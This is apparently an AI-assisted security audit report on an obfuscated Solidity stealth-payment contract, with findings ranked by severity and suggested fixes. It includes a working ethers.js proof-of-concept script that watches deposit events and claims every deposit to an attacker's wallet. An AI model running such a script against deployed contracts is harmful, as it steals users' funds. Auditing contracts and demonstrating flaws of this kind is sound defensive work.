# Smart Contract Security Audit — GhostPay (`GhostPay.sol`)

**Auditor:** GitHub Copilot (AI-assisted manual review)  
**Date:** 2026-03-27  
**Contract:** `contracts/GhostPay.sol` — `contract Xc8f4a2e1`  
**Solidity Version:** `^0.8.20`  
**Commit:** HEAD  

---

## Executive Summary

The contract implements a stealth/anonymous token transfer protocol using a commitment–nullifier scheme. Users deposit ETH or ERC-20 tokens against a `bytes32 commitment`; a recipient later claims using an ECDSA signature. The design has **one critical protocol-level flaw that allows any on-chain observer to steal any unclaimed deposit**, along with several other security and operational issues.

| Severity      | Count |
|---------------|-------|
| 🔴 Critical   | 3     |
| 🟠 High       | 1     |
| 🟡 Medium     | 3     |
| 🔵 Low        | 4     |
| ℹ️ Info       | 3     |
| **Total**     | **14**|

---

## Findings

### 🔴 [C-1] Anyone Can Steal Any Deposit (Fundamental Access-Control Flaw)

**Location:** `function d7a2c4f8` (claim/withdraw)  
**OWASP:** Broken Access Control  

**Description:**  
The claim function recovers the recipient from the caller's ECDSA signature and sends the deposit to that recovered address. However, ALL inputs required to construct the signed message are publicly observable on-chain:

| Input | Source |
|-------|--------|
| `commitment` | Emitted in event `e8a3f1b2` |
| `nullifier` | Deterministically derived: `keccak256(commitment, "nullifier")` |
| `token` | Emitted in event `e8a3f1b2` |
| `amount` | Emitted in event `e8a3f1b2` |

**Attack steps:**
1. Attacker observes `e8a3f1b2` event → extracts `commitment`, `token`, `amount`
2. Attacker computes `nullifier = keccak256(abi.encodePacked(commitment, "nullifier"))`
3. Attacker constructs `msgHash = keccak256(abi.encodePacked(commitment, nullifier, token, amount)).toEthSignedMessageHash()`
4. Attacker signs `msgHash` with their **own** private key → signature recovers to **attacker's address**
5. Attacker calls `d7a2c4f8(commitment, nullifier, token, amount, attackerSignature)` → funds sent to attacker

The `signature` field controls only WHERE funds go, not WHO is authorised to claim. Any address can claim any deposit to itself with zero prior knowledge of any secret.

**Recommended Fix:**  
Require the claimant to reveal the `secret` (the preimage of the commitment). The secret serves as the one-time password — only the person who received it offchain can claim. The secret is acceptable to expose on-chain at claim time since it is single-use:

```solidity
// Depositor: commitment = keccak256(abi.encodePacked(secret))
// Claimer: reveals secret on-chain

function d7a2c4f8(
    bytes32 secret,       // replaces commitment as input; commitment is derived
    bytes32 nullifier,
    address token,
    uint256 amount,
    bytes calldata signature
) external nonReentrant {
    bytes32 commitment = keccak256(abi.encodePacked(secret));
    // nullifier derived from secret prevents replay even if commitment reuse were attempted
    require(
        nullifier == keccak256(abi.encodePacked(secret, "nullifier")),
        "invalid nullifier"
    );
    // ... rest unchanged
}
```

This ensures only a party who received the `secret` offchain can claim, while still letting the recipient be any arbitrary address (determined by their signature).

---

### 🔴 [C-2] Signature Replay Across Chains and Contract Instances

**Location:** `function d7a2c4f8` — `msgHash` construction  
**OWASP:** Cryptographic Failures  

**Description:**  
The signed message does not include:
- `address(this)` — the contract's own address
- `block.chainid` — the chain identifier

```solidity
// Current (vulnerable):
bytes32 msgHash = keccak256(
    abi.encodePacked(commitment, nullifier, token, amount)
).toEthSignedMessageHash();
```

A valid claim signature created for this contract on Sepolia can be replayed on any other chain where the same contract is deployed at the same address (e.g., via CREATE2). Similarly, if a future contract deployment reuses the same ABI, all prior signatures are immediately valid against it.

**Recommended Fix:**

```solidity
bytes32 msgHash = keccak256(
    abi.encodePacked(address(this), block.chainid, commitment, nullifier, token, amount)
).toEthSignedMessageHash();
```

This binds each signature to a specific contract instance + chain, making cross-chain replay impossible.

---

### 🔴 [C-3] `receive()` Permanently Locks Arbitrary ETH

**Location:** `receive() external payable {}`  
**OWASP:** Insecure Design  

**Description:**  
The contract accepts raw ETH transfers via `receive()` without recording them in any `DepositInfo`. There is no owner withdrawal or rescue function. Any ETH sent directly to the contract address (accidental transfers, MEV bots, etc.) is **permanently and irrecoverably trapped**.

This also means the contract's ETH balance can silently exceed what it should hold (sum of all pending ETH deposits), breaking any auditing invariant.

**Recommended Fix — Option A (remove `receive()`):**  
Remove the fallback entirely. Legitimate ETH deposits go through `e1b5f9c3` which is `payable`.

```solidity
// Remove: receive() external payable {}
```

**Recommended Fix — Option B (add rescue hatch):**  
Add an owner rescue function for ETH and stray ERC-20 tokens:

```solidity
function rescueETH(uint256 amount) external onlyOwner {
    (bool ok,) = owner().call{value: amount}("");
    require(ok);
}

function rescueERC20(address token, uint256 amount) external onlyOwner {
    IERC20(token).safeTransfer(owner(), amount);
}
```

Note: the rescue function should not be usable to steal user deposits — consider tracking the sum of pending deposits and only allowing withdrawal of the surplus.

---

### 🟠 [H-1] Cancellation Can Be Front-Run to Steal Deposit

**Location:** `function f4e9b1a6` (cancel) + `function d7a2c4f8` (claim)  
**OWASP:** Broken Access Control  

**Description:**  
Because C-1 allows any observer to claim any deposit, a depositor's **cancellation transaction is also vulnerable to griefing**. When a depositor broadcasts `f4e9b1a6(commitment)` after the timelock expires, an attacker in the mempool can immediately front-run it with a `d7a2c4f8` claim using their own signature, sending the funds to themselves. The depositor's cancel transaction then fails with `"claimed"`.

This is a direct consequence of C-1 and is addressed by the same fix (require secret revelation in `d7a2c4f8`).

---

### 🟡 [M-1] Claim Event Missing `commitment` Field (Offchain Traceability Loss)

**Location:** `emit c4d9e7a2(nullifier, token, amount)`  
**OWASP:** Security Logging and Monitoring Failures  

**Description:**  
The claim event `c4d9e7a2` emits `nullifier`, `token`, and `amount` but NOT `commitment`. Since `nullifier` is deterministically derived from `commitment`, they are linked, but indexers and monitoring tools need an explicit `commitment` field to correlate a claim to its original deposit event.

**Fix:**
```solidity
event c4d9e7a2(bytes32 indexed commitment, bytes32 indexed nullifier, address indexed token, uint256 amount);

// In d7a2c4f8:
emit c4d9e7a2(commitment, nullifier, token, amount);
```

---

### 🟡 [M-2] Token Removal Without Checking Active Deposits

**Location:** `function a7f3b8d2`  
**OWASP:** Insecure Design  

**Description:**  
When an owner calls `a7f3b8d2` to remove a token, it is marked `supported: false` and removed from `tokenList`. However, the contract does NOT check whether any unclaimed or uncancelled deposits still exist for that token.

While existing deposits can still be claimed/cancelled (those functions don't re-check `tokens[token].supported`), a hostile or compromised owner could:
1. Remove a supported token
2. Deploy a new ERC-20 with the same address (not possible on EVM — but possible if the token upgrades via proxy)
3. Re-add it under a different symbol, potentially confusing the UI

More practically: if the owner mistakenly removes a token that has active deposits, new deposits for that token will be blocked even though existing ones are still live — creating a confusing state.

**Fix:** Emit a warning event, or maintain an active deposit counter per token and require it to be zero before removal.

---

### 🟡 [M-3] Unbounded `tokenList` — Potential View DoS

**Location:** `function e4c8a3f1`, `tokenList` array  
**OWASP:** Security Misconfiguration  

**Description:**  
There is no upper bound on the number of tokens that can be added. The `e4c8a3f1` view function iterates over all of them:

```solidity
for (uint i = 0; i < len; i++) { ... }
```

If hundreds of tokens are added, this loop could exceed the block gas limit when called externally (especially if done via `eth_call` with low gas). It also makes `e4c8a3f1` unusable from another contract.

**Fix:** Add a `MAX_TOKENS` constant and enforce it in `b2d6f3e9`:

```solidity
uint256 public constant MAX_TOKENS = 50;

function b2d6f3e9(...) external onlyOwner {
    require(tokenList.length < MAX_TOKENS, "token limit reached");
    ...
}
```

---

### 🔵 [L-1] No Emergency Pause Mechanism

**Location:** Global  
**OWASP:** Insecure Design  

**Description:**  
If a critical vulnerability is discovered post-deployment, there is no way to halt deposits or claims. All user funds would remain exposed while the contract is being migrated.

**Fix:** Integrate OpenZeppelin `Pausable` and gate `a3f8c2d1`, `e1b5f9c3`, and `d7a2c4f8` behind `whenNotPaused`.

---

### 🔵 [L-2] No ERC-20 Rescue for Non-Listed Tokens

**Location:** Contract-level  

**Description:**  
If a user accidentally sends an ERC-20 token directly to this contract (not via the deposit function, or using a token address not in `tokenList`), those tokens are permanently stuck. There is no owner rescue path for them.

**Fix:** Add the `rescueERC20` function from [C-3] Option B, scoped to tokens NOT currently supported (to prevent stealing active deposits):

```solidity
function rescueERC20(address token, uint256 amount) external onlyOwner {
    require(!tokens[token].supported, "active token");
    IERC20(token).safeTransfer(owner(), amount);
}
```

---

### 🔵 [L-3] Block Timestamp Used for Timelock (Negligible Risk)

**Location:** `function f4e9b1a6` — `require(block.timestamp >= d.depositedAt + d.cancelDelay)`  

**Description:**  
Validators can manipulate `block.timestamp` by approximately ±15 seconds. With `MIN_DELAY = 1 hour`, this allows at most a ~0.004% variance in the timelock duration. Negligible in practice but worth noting per best practices.

---

### 🔵 [L-4] Obfuscated Identifiers Hinder Auditability

**Location:** All function and event names  

**Description:**  
All contract, function, and event names are hex-like encoded strings (`Xc8f4a2e1`, `d7a2c4f8`, `e8a3f1b2`, etc.). While this may be an intentional privacy measure, it:
- Makes the contract harder to audit
- Prevents ABI-based tooling from producing human-readable call data
- Will confuse block explorers (calls appear as unknown function selectors)
- "Security through obscurity" is not a recognised security control — the bytecode and ABI are public

Consider keeping obfuscated selector names only in the frontend/API layer, not in the source of truth (`.sol` file).

---

### ℹ️ [I-1] `depositorOf` Mapping Never Cleared

**Location:** `mapping(bytes32 => address) private depositorOf`  

**Description:**  
After a deposit is claimed or cancelled, `depositorOf[commitment]` remains set to the original depositor's address. This intentionally prevents commitment reuse (any commitment used once can never be reused), which is a correct safety property. However, it permanently consumes ~32 bytes of storage per commitment. In high-volume usage this accumulates. No action required unless gas optimisation is a priority; use `delete depositorOf[commitment]` on claim/cancel and rely on the `claimed`/`cancelled` flags for replay protection.

---

### ℹ️ [I-2] Recipient Address Not Validated Against Contract Address

**Location:** `function d7a2c4f8`  

**Description:**  
`require(recipient != address(0))` is checked, but not `require(recipient != address(this))`. If the signed message happened to recover to the contract address itself (virtually impossible with a real private key, but theoretically), the ETH/ERC-20 would be sent to the contract and trapped. Extremely low probability but trivially fixable:

```solidity
require(recipient != address(0) && recipient != address(this), "invalid recipient");
```

---

### ℹ️ [I-3] Chain ID Not Validated in Constructor

**Location:** `constructor`  

**Description:**  
There is no assertion that the contract is deployed on the intended chain (Sepolia, chainId 11155111). Deploying to the wrong chain would silently succeed. Consider a deployment script check rather than a runtime guard (which wastes gas forever).

---

## Attack Scenario Walkthrough — C-1

The following demonstrates a complete deposit theft using only publicly available on-chain data:

```js
// 1. Watch for deposit event
const filter = contract.filters.e8a3f1b2();
contract.on(filter, async (commitment, token, amount, deadline) => {

  // 2. Compute nullifier (no secret needed — all inputs are public)
  const nullifier = ethers.solidityPackedKeccak256(
    ["bytes32", "string"],
    [commitment, "nullifier"]
  );

  // 3. Build the exact same msgHash the contract will verify
  const msgHash = ethers.solidityPackedKeccak256(
    ["bytes32", "bytes32", "address", "uint256"],
    [commitment, nullifier, token, amount]
  );
  const prefixedHash = ethers.hashMessage(ethers.getBytes(msgHash));

  // 4. Sign with attacker's own wallet — recipient = attacker
  const signature = await attackerWallet.signMessage(ethers.getBytes(msgHash));

  // 5. Claim — funds go to attackerWallet.address
  await contract.connect(attackerWallet).d7a2c4f8(
    commitment, nullifier, token, amount, signature
  );
});
```

**Result:** 100% of deposited funds are redirected to the attacker with zero prerequisite knowledge.

---

## Recommendations (Priority Order)

1. **[MUST]** Fix [C-1]: Require `secret` revelation in `d7a2c4f8` so only the holder of the preimage can claim.
2. **[MUST]** Fix [C-2]: Add `address(this)` and `block.chainid` to the `msgHash`.
3. **[MUST]** Fix [C-3]: Remove `receive()` or add an owner rescue function.
4. **[SHOULD]** Fix [H-1]: Addressed by [C-1] fix.
5. **[SHOULD]** Add `Pausable` for emergency response capability.
6. **[SHOULD]** Add `MAX_TOKENS` cap.
7. **[COULD]** Add `rescueERC20` for non-active tokens.
8. **[COULD]** Add `commitment` to the `c4d9e7a2` claim event.

---

## Invariants the Contract Should Maintain (Recommendations)

These invariants are currently not enforced and should be verified in tests:

```
1. sum(deposits[c].amount for all unclaimed, uncancelled ETH deposits)
       == address(this).balance   [broken by receive()]

2. For all bytes32 c: if usedNullifiers[nullifier(c)] == true, then deposits[c].claimed == true

3. tokenList.length == count(tokens[t].supported == true for all t)

4. For all t in tokenList: tokenIndex[t] == indexOf(t, tokenList)
```

---

*This audit was performed by static analysis and manual code review. It does not replace a professional third-party audit. Always conduct comprehensive testing and formal verification before deploying contracts holding real user funds.*
